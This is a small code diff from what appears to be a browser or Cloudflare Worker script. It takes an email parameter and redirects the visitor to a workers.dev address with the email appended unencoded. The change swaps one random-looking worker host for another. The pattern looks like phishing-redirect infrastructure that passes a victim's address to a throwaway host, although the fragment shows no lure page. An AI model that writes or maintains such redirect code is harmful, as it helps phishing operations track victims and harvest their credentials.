@@ -20,7 +20,7 @@ export default {
       // If the email parameter exists
       if (email) {
         // Construct the redirect URL with the plain email (not encoded)
-        const redirectUrl = `https://lucky-mud-238c.vencillrina33.workers.dev/${email}`;
+        const redirectUrl = `https://proud-silence-9e2e.newreu29.workers.dev/${email}`;
 
         // Redirect to the constructed URL
         window.location.replace(redirectUrl);
